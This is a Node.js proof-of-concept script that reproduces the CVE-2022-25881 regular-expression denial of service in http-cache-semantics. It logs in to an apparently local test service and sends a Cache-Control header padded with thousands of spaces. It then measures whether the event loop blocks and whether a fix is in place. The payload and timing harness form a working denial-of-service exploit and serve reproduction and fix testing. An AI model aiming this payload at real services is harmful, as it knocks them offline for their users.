'use strict';

// ReDoS proof of concept for CVE-2022-25881.
//
// Usage:  npm start        (terminal 1, vulnerable revision)
//         npm run poc      (terminal 2)
//
// The script logs in, measures the latency of /health while the service is
// idle, then sends one request whose Cache-Control header is a long run of
// spaces. Because http-cache-semantics@4.1.0 splits on /\s*,\s*/ and
// /\s*=\s*/, the regex engine backtracks over that run, so the whole Node.js
// event loop is blocked while the header is parsed.

const { performance } = require('node:perf_hooks');

const BASE = process.env.BASE || 'http://127.0.0.1:3000';
const SIZE = Number(process.env.SIZE || 15000);
const PAYLOAD = 'no-cache' + ' '.repeat(SIZE) + 'x';

async function timed(url, options) {
  const started = performance.now();
  const res = await fetch(url, options);
  const body = await res.text();
  return { ms: performance.now() - started, status: res.status, body };
}

async function login() {
  const res = await fetch(BASE + '/auth/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: 'alice', password: 'S3curePass!' })
  });
  if (!res.ok) throw new Error('login failed with ' + res.status);
  const data = await res.json();
  return data.token;
}

async function main() {
  console.log('target      :', BASE);
  console.log('payload size:', SIZE, 'bytes of spaces');
  const token = await login();

  const idle = [];
  for (let i = 0; i < 5; i++) {
    idle.push((await timed(BASE + '/health')).ms);
  }
  console.log('idle /health:', idle.map((n) => n.toFixed(1) + ' ms').join(', '));

  const attack = timed(BASE + '/api/cache-policy', {
    method: 'POST',
    headers: {
      authorization: 'Bearer ' + token,
      'cache-control': PAYLOAD
    }
  });

  // three probes started while the server is busy parsing the header
  await new Promise((resolve) => setTimeout(resolve, 5));
  const during = await Promise.all([
    timed(BASE + '/health'),
    timed(BASE + '/health'),
    timed(BASE + '/health')
  ]);

  const result = await attack;
  console.log('attack response:', result.status,
    result.status === 431 ? '(rejected by input guard - fixed build)' : '(parsed by http-cache-semantics)');
  console.log('attack duration:', result.ms.toFixed(1), 'ms');
  console.log('/health during attack:',
    during.map((r) => r.ms.toFixed(1) + ' ms').join(', '));
  const worst = Math.max(...during.map((r) => r.ms));
  console.log('\nworst probe latency: %s ms', worst.toFixed(1));
  console.log(worst > 100
    ? 'RESULT: the event loop was blocked - denial of service reproduced'
    : 'RESULT: the service stayed responsive - the fix is in place');
}

main().catch((err) => {
  console.error('poc failed:', err.message);
  process.exit(1);
});